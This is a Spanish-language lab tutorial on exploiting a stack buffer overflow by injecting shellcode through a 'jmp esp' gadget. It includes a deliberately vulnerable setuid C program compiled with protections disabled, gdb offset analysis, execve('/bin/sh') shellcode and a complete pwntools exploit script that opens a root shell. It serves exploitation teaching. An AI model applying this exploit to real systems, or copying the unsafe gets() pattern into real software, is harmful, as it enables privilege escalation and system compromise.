---
original autor: CrazyCat
coautor: naibu3
---

#bufferOverflow 

## ¿Qué es?

Ya hemos visto cómo funciona un *buffer overflow* de tipo *Ret2Win*, y como poder pasar parámetros. Sin embargo, en multitud de ocasiones no existirá una función concreta a la que llamar. En estos casos, podremos tratar de inyectar en el *stack* un *shellcode* que nos otorgará una *shell*.

## Ejercicio1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código (está en la carpeta de ejercicios):

```c
#include <stdio.h>

int secret_function() {
    asm("jmp %esp");
}

void receive_feedback()
{
    char buffer[64];

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");
    gets(buffer);
}

int main()
{
    setuid(0);
    setgid(0);

    receive_feedback();

    return 0;
}
```

En este caso no tenemos una función maliciosa, aunque sí que hay una función a la que no se llama. Esto se debe a que tendremos que hacer uso de un *gaget ROP*, `jmp %esp`, por ello está dentro de la función `secret_function`.

Por otro lado, con `setuid` y `setgid` hacemos que el binario se ejecute como *root*, dando como resultado que la *shell* que obtengamos tenga privilegios.

La idea sería tener un archivo *flag.txt* que sólo pueda ser leído por el administrador, de forma que tengamos que conseguir una *shell* como *root* para leerlo.

Vamos a compilar el binario, es importante que no tenga la protección *NX* (`-z execstack`), ya que es la que hace que no podamos ejecutar instrucciones alojadas en el *stack*. 

```bash
gcc -o server server.c -fno-stack-protector -z execstack -no-pie -m32
```


### Análisis del binario

Como hemos dicho, si lanzamos [[checksec]], debería tener una salida tal que:

```checksec
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

Importante que esté el `NX disabled`. También podríamos lanzar [[ghidra]] y *file*, pero como hemos compilado nosotros el código no es necesario.

Vamos a proceder al análisis con [[gdb]]-[[pwndbg]], comenzando por encontrar el *offset* hasta sobrescribir la dirección de retorno con *cyclic*:

```bash
gdb-pwndbg server
```
```gdb-pwndbg
cyclic 100
```
```gdb-pwndbg
run
```
```server
Please leave your comments for the server admin but DON'T try to steal our flag.txt:

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
```

Como siempre, revisamos el valor de `EIP`:

```gdb-pwndbg
*EBP  0x61616173 ('saaa')
*ESP  0xffffd0b0 ◂— 'uaaavaaawaaaxaaayaaa'
*EIP  0x61616174 ('taaa')
```

Y con *cyclic* calculamos el *offset*:

```bash
cyclic -l taaa
```
```cyclic
Found at offset 76
```

Como vemos, es 76. Como teníamos una función que llamaba a la instrucción `jmp %esp`, podemos tratar de me introducir en dicho registro un *shellcode* y llamar a dicha instrucción.

Como hemos visto antes, el registro `esp` es el contiguo a `eip` (`eip` contenía `taaa` y `esp`, `uaaav...`), por tanto podríamos hacer la prueba introduciendo caracteres con python2:

```bash
python2 -c 'print "A"*76 + "B"*4 + "C"*100'
```

Si copiamos la salida y se la pasamos al programa mediante [[gdb]]-[[pwndbg]], podremos ver lo siguiente:

```server
Please leave your comments for the server admin but DON'T try to steal our flag.txt:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
```
```gdb-pwndbg
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd0b0 ◂— 'CCCCCCCC[...]'
*EIP  0x42424242 ('BBBB')
```

Por lo que podemos concluir que efectivamente somos capaces de escribir en dicho registro y en la dirección de retorno.


## Explotación

Para la explotación, almacenaremos un *shellcode* en `esp` y sobrescribiremos la dirección de retorno con la dirección del *gadget* (la instrucción en ensamblador) de `secret_function` (`jmp %esp`), de forma que dicha instrucción ejecutará el *shellcode*.

Para obtener la dirección del *ROP gadget* (la instrucción) `jmp %esp`, utilizaremos [[ropper]]:

```bash
ropper --file server --search "jmp esp"
```
```ropper
0x0804919f: jmp esp;
```

Por otro lado, el *shellcode* que utilizaremos lo obtendremos con la herramienta *shellcraft* (incluida en la librería [[pwntools]]):

```bash
shellcraft -l | grep linux | grep sh
```
```shellcraft
[...]
i386.linux.sh
[...]
```

```bash
shellcraft i386.linux.sh -f a
```
```shellcraft
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```
> Para verla en formato ensamblador.

Para la explotación utilizaremos python3 y la librería [[pwntools]]. Crearemos un *script* que simplificará el proceso. El *script* es el siguiente:

```python
#!/bin/python3

from pwn import *

exe = './server'

#Automatically get context arch, bits, os etc, para luego poder buscar rop gadgets
elf = context.binary = ELF(exe, checksec=False)

#context.log_level = 'debug'    #Modo debug para ver que esta pasando

io = process(exe)

#Offset hasta EIP
padding = 76

jmp_esp = asm('jmp esp')    #Crea la instruccion jmp esp en ensamblador para poder buscarla
jmp_esp = next(elf.search(jmp_esp))     #Busca la secuencia jmp esp en el contexto

shellcode = asm(shellcraft.sh())

#shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,   # Podrian ser A, pero es mas correcto
    jmp_esp,
    #asm('nop') * 16,   #A veces se necesita un pequeño offset, que debe ser nops para que no se ejecute
    shellcode
)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
```

Como vemos, debemos buscar la instrucción (en ensamblador) en el contexto del binario. Posteriormente, creamos un *payload* y lo pasamos al programa, para finalmente ponernos en modo interactivo para utilizar la *shell*.

Y ya estaríamos dentro!